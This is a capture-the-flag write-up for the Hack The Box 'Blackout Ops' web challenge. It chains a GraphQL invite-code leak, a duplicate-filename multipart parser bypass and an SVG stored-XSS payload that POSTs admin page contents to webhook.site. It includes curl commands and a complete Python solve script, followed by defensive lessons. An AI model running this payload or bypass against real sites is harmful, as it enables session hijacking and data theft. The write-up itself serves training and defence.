# HTB - Blackout Ops Writeup

**Flag:** `HTB{l00k0ut_f04_mult1p4rt_byP455_4nd_gr4phQL_bug5}`  
**Category:** Web  
**Difficulty:** Medium  
**Tech Stack:** Node.js, Express, GraphQL (Apollo), Nunjucks, SQLite, Nginx (OpenResty + lua-resty-multipart-parser), Puppeteer

---

## Table of Contents

1. [Challenge Overview](#challenge-overview)
2. [Reconnaissance](#reconnaissance)
3. [Vulnerability 1 — GraphQL Registration Bypass (Get Verified)](#vulnerability-1--graphql-registration-bypass-get-verified)
4. [Vulnerability 2 — Multipart Parser Bypass (Upload HTML/SVG)](#vulnerability-2--multipart-parser-bypass-upload-htmlsvg)
5. [Vulnerability 3 — Stored XSS via Admin Bot + Flag Exfiltration](#vulnerability-3--stored-xss-via-admin-bot--flag-exfiltration)
6. [Full Exploit Chain Summary](#full-exploit-chain-summary)
7. [Complete Exploit Scripts](#complete-exploit-scripts)
8. [Key Lessons Learned](#key-lessons-learned)

---

## Challenge Overview

Blackout Ops is a web challenge featuring an Express.js application with a GraphQL API. The application has:

- User registration and login via GraphQL mutations
- An account verification system using invite codes
- A file upload endpoint protected by Nginx's `lua-resty-multipart-parser`
- An incident report submission system that triggers an **admin bot** (Puppeteer) to visit submitted URLs
- An `/admin` route that renders a flag via Nunjucks server-side templating — only accessible to admin-role users

The goal is to make the admin bot visit a page we control, extract the flag from `/admin`, and exfiltrate it to us.

---

## Reconnaissance

### Application Structure

```
challenge/
├── app.js              # Express app, Nunjucks config, Apollo GraphQL
├── bot.js              # Puppeteer bot — logs in as admin, visits evidenceUrl
├── graphql/
│   ├── resolvers.js    # All GraphQL mutation/query logic
│   └── schema.js       # GraphQL type definitions
├── routes/
│   ├── pages.js        # /admin route — renders flag via Nunjucks
│   └── upload.js       # File upload handler using @fastify/busboy
└── views/
    └── admin.html      # Contains {{ flag }} — rendered server-side
```

### Key Observations

**1. The `/admin` route reads the flag and renders it:**
```javascript
router.get('/admin', (req, res) => {
  if (!req.session.user || req.session.user.role !== 'admin') {
    return res.redirect('/dashboard');
  }
  const flag = fs.readFileSync('/flag.txt', 'utf8');
  res.render('admin.html', { flag });  // Nunjucks renders {{ flag }}
});
```

**2. The bot logs in as admin then visits any URL you submit:**
```javascript
// bot.js
await page.goto("http://127.0.0.1:1337/", ...);  // logs in via nginx
// fills in admin credentials from DB
await page.goto(url);  // visits YOUR evidenceUrl
await page.waitForTimeout(3000);
```

**3. Uploads require a verified account:**
```javascript
if (!req.session.user.verified) {
  return res.status(403).send("User is not verified to upload files.");
}
```

**4. Nginx uses `lua-resty-multipart-parser` to validate file extensions** — only image extensions (gif, png, jpg, etc.) are allowed.

---

## Vulnerability 1 — GraphQL Registration Bypass (Get Verified)

### The Bug

The `register` GraphQL mutation creates a user with an `inviteCode`. Normally, you would need someone to send you this code out-of-band. However, **the mutation returns `inviteCode` directly in the response** if you include it in your query selection set — no authentication required.

```graphql
mutation {
  register(email: "hacker@blackouts.htb", password: "hacker123") {
    id
    email
    inviteCode   # <-- returned in plaintext!
  }
}
```

### Exploit Steps

**Step 1 — Register and extract invite code:**
```bash
curl -s -X POST http://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { register(email: \"hacker@blackouts.htb\", password: \"hacker123\") { id email inviteCode } }"
  }' | jq .
```

Response:
```json
{
  "data": {
    "register": {
      "id": "3",
      "email": "hacker@blackouts.htb",
      "inviteCode": "F0GYG62T"
    }
  }
}
```

**Step 2 — Login and save session cookie:**
```bash
curl -s -c cookies.txt -X POST http://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { login(email: \"hacker@blackouts.htb\", password: \"hacker123\") { id role verified } }"
  }' | jq .
```

**Step 3 — Verify account using the returned invite code:**
```bash
curl -s -b cookies.txt -X POST http://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { verifyAccount(inviteCode: \"F0GYG62T\") { id verified } }"
  }' | jq .
```

Response: `"verified": true` — we now have upload access.

---

## Vulnerability 2 — Multipart Parser Bypass (Upload HTML/SVG)

### The Bug

Nginx uses `lua-resty-multipart-parser` to validate uploaded file extensions **before** passing the request to the Node.js app. Node.js uses `@fastify/busboy` to actually parse the multipart body.

These two parsers handle **duplicate `filename=` fields differently**:

- `lua-resty-multipart-parser` reads the **first** `filename=` value → sees `evil.gif` → passes validation ✅
- `@fastify/busboy` uses the **last** `filename=` value → sees `../uploads/exploit.svg` → saves there ✅

This is a classic **parser differential / HTTP desync** attack on multipart form data.

### The Bypass

Normal request (blocked):
```
Content-Disposition: form-data; name="file"; filename="exploit.svg"
```

Bypass (lua sees gif, busboy saves as svg):
```
Content-Disposition: form-data; name="file"; filename="evil.gif"; filename="../uploads/exploit.svg"
```

### What We Upload

An SVG file with embedded JavaScript that:
1. Fetches `/admin` using the bot's own admin session (same-origin, relative URL)
2. Base64-encodes the HTML response (which contains the flag)
3. POSTs it to our webhook

```xml
<svg xmlns="http://www.w3.org/2000/svg" width="400" height="400">
  <script type="text/javascript">
    fetch('/admin')
      .then(res => res.text())
      .then(html =>
        fetch('https://webhook.site/YOUR-ID', {
          method: 'POST',
          body: btoa(html)
        })
      );
  </script>
</svg>
```

### Why SVG?

SVG files support `<script>` tags and execute JavaScript when opened in a browser — making them perfect for XSS payloads while bypassing image-extension filters.

### Why Relative `/admin` URL?

The bot visits `http://127.0.0.1:1337/files/exploit.svg`. Using a relative URL `/admin` resolves to `http://127.0.0.1:1337/admin` — same origin. The bot's admin session cookie is automatically included, so Nunjucks renders the flag.

### Why webhook.site Instead of Our Kali IP?

The HTB container's network cannot reach our VPN tun0 IP (`10.10.16.x`) for outbound HTTP. However, it CAN reach external internet endpoints like `webhook.site`. This is the intended exfiltration channel.

---

## Vulnerability 3 — Stored XSS via Admin Bot + Flag Exfiltration

### The Bot Flow

When we submit an incident report with an `evidenceUrl`:

```javascript
// resolvers.js — submitIncidentReport
bot.visitReport(args.evidenceUrl, adminUser.email, adminUser.password)
```

The bot:
1. Navigates to `http://127.0.0.1:1337/` and logs in with admin credentials
2. Navigates to our `evidenceUrl`
3. Waits 3 seconds then closes

When the bot visits our uploaded SVG, the JavaScript executes **in the context of the admin's authenticated session**, fetches `/admin`, gets the flag, and sends it to webhook.site.

### Attack Flow Diagram

```
[Attacker]                    [HTB Container]                [webhook.site]
    |                               |                               |
    |-- Upload exploit.svg -------->|                               |
    |   (multipart bypass)          |                               |
    |                               |                               |
    |-- submitIncidentReport ------>|                               |
    |   evidenceUrl=.../exploit.svg |                               |
    |                               |                               |
    |                        [Bot logs in as admin]                 |
    |                        [Bot visits exploit.svg]               |
    |                        [JS: fetch('/admin')]                  |
    |                        [Gets flag from Nunjucks]              |
    |                        [POST btoa(html)] ---------------------->
    |                               |                               |
    |<-- curl webhook.site -----------------------------------------|
    |   decode base64 → flag!       |                               |
```

---

## Full Exploit Chain Summary

| Step | Vulnerability | Effect |
|------|--------------|--------|
| 1 | GraphQL `inviteCode` returned in response | Bypass verification requirement |
| 2 | Dual `filename=` multipart parser differential | Upload SVG/HTML despite extension filter |
| 3 | Admin bot visits attacker-controlled URL | XSS executes as admin |
| 4 | Relative `/admin` fetch with admin session | Flag rendered and captured |
| 5 | webhook.site exfiltration | Flag delivered to attacker |

---

## Complete Exploit Scripts

### Full Automated Exploit

```python
#!/usr/bin/env python3
# Blackout Ops - Full Exploit
# Usage: python3 solve.py <TARGET_IP:PORT> <WEBHOOK_URL>
# Example: python3 solve.py 154.57.164.82:32445 https://webhook.site/YOUR-ID

import sys
import socket
import requests
import re

TARGET = sys.argv[1] if len(sys.argv) > 1 else "154.57.164.82:32445"
WEBHOOK = sys.argv[2] if len(sys.argv) > 2 else "https://webhook.site/YOUR-ID"
GRAPHQL = f"http://{TARGET}/graphql"

EMAIL = "pwner@blackouts.htb"
PASSWORD = "pwner123"

print(f"[*] Target: {TARGET}")
print(f"[*] Webhook: {WEBHOOK}")

# ── Step 1: Register ──────────────────────────────────────────────────────────
print("\n[1] Registering account...")
r = requests.post(GRAPHQL, json={
    "query": f'mutation {{ register(email: "{EMAIL}", password: "{PASSWORD}") {{ id inviteCode }} }}'
})
data = r.json()["data"]["register"]
invite_code = data["inviteCode"]
print(f"    invite code: {invite_code}")

# ── Step 2: Login ─────────────────────────────────────────────────────────────
print("[2] Logging in...")
session = requests.Session()
session.post(GRAPHQL, json={
    "query": f'mutation {{ login(email: "{EMAIL}", password: "{PASSWORD}") {{ id role verified }} }}'
})
cookie_val = session.cookies.get("connect.sid")
print(f"    session cookie: {cookie_val[:30]}...")

# ── Step 3: Verify account ────────────────────────────────────────────────────
print("[3] Verifying account...")
r = session.post(GRAPHQL, json={
    "query": f'mutation {{ verifyAccount(inviteCode: "{invite_code}") {{ id verified }} }}'
})
print(f"    verified: {r.json()['data']['verifyAccount']['verified']}")

# ── Step 4: Upload SVG payload ────────────────────────────────────────────────
print("[4] Uploading SVG XSS payload...")

svg_payload = f"""<svg xmlns="http://www.w3.org/2000/svg" width="400" height="400">
  <script type="text/javascript">
    fetch('/admin')
      .then(res => res.text())
      .then(html =>
        fetch('{WEBHOOK}', {{
          method: 'POST',
          body: btoa(html)
        }})
      );
  </script>
</svg>"""

boundary = "XBOUNDARY123"
body = (
    f"--{boundary}\r\n"
    f'Content-Disposition: form-data; name="file"; filename="evil.gif"; filename="../uploads/exploit.svg"\r\n'
    f"Content-Type: image/svg+xml\r\n\r\n"
    f"{svg_payload}\r\n"
    f"--{boundary}--\r\n"
)
body_bytes = body.encode()

host, port = TARGET.split(":")
request = (
    f"POST /upload HTTP/1.1\r\n"
    f"Host: {TARGET}\r\n"
    f"Cookie: connect.sid={cookie_val}\r\n"
    f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
    f"Content-Length: {len(body_bytes)}\r\n"
    f"Connection: close\r\n\r\n"
).encode() + body_bytes

s = socket.socket()
s.connect((host, int(port)))
s.sendall(request)
resp = s.recv(4096).decode()
s.close()

if "Upload complete" in resp:
    print("    SVG uploaded successfully!")
else:
    print(f"    ERROR: {resp}")
    sys.exit(1)

# ── Step 5: Verify SVG is accessible ─────────────────────────────────────────
svg_url = f"http://{TARGET}/files/exploit.svg"
r = requests.get(svg_url)
if "<script" in r.text:
    print(f"    SVG accessible at: {svg_url}")
else:
    print("    ERROR: SVG not accessible")
    sys.exit(1)

# ── Step 6: Trigger admin bot ─────────────────────────────────────────────────
print("[5] Submitting incident report to trigger bot...")
r = session.post(GRAPHQL, json={
    "query": f'mutation {{ submitIncidentReport(title: "x", details: "x", evidenceUrl: "http://127.0.0.1:1337/files/exploit.svg") {{ id }} }}'
})
report_id = r.json()["data"]["submitIncidentReport"]["id"]
print(f"    Report submitted: id={report_id}")

print(f"\n[*] Bot will visit the SVG in ~5 seconds.")
print(f"[*] Watch webhook.site for incoming POST request.")
print(f"[*] Then decode the flag with:")
print(f'    echo "BASE64_BODY" | base64 -d | grep -o \'HTB{{[^}}]*}}\'')
```

### Decode Flag from Webhook

```bash
# After receiving base64 on webhook.site:
echo "PASTE_BASE64_HERE" | base64 -d | grep -o 'HTB{[^}]*}'
```

---

## Key Lessons Learned

### 1. GraphQL Over-Exposure
Never return sensitive fields (like `inviteCode`) in mutation responses unless explicitly required. Use field-level authorization or separate the invite code delivery channel entirely.

### 2. Multipart Parser Differentials
When using multiple layers to validate file uploads (e.g., Nginx WAF + app parser), ensure both use the **same parser** or the **same field selection logic**. Duplicated `filename=` fields in `Content-Disposition` are a well-known bypass for `lua-resty-multipart-parser`.

**Reference:** https://github.com/bungle/lua-resty-multipart/issues/4

### 3. Admin Bots Are High-Value Targets
Any feature that makes an authenticated admin visit an attacker-controlled URL is extremely dangerous. The bot should:
- Validate URLs against an allowlist
- Use a sandboxed profile with no session persistence
- Disable JavaScript execution for untrusted origins

### 4. Same-Origin Exfiltration
Using a **relative URL** (`/admin` instead of `http://127.0.0.1:1337/admin`) is crucial when JavaScript is executing from within the same origin — it automatically carries the session cookie without needing `credentials: 'include'`.

### 5. External Exfiltration Channels
When the target container blocks outbound connections to your VPN IP, use a public webhook service (`webhook.site`, Burp Collaborator, interactsh) that the container can reach over the internet.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `curl` | GraphQL queries, testing endpoints |
| `python3 + socket` | Raw HTTP multipart upload (bypass parser) |
| `webhook.site` | Receive exfiltrated flag over HTTP |
| `nc` | Initial callback testing |
| `jq` | JSON response parsing |

---

*Solved by: Nhakachh — CADT Year 3, CBSA Group 7*  
*Date: June 26, 2026*
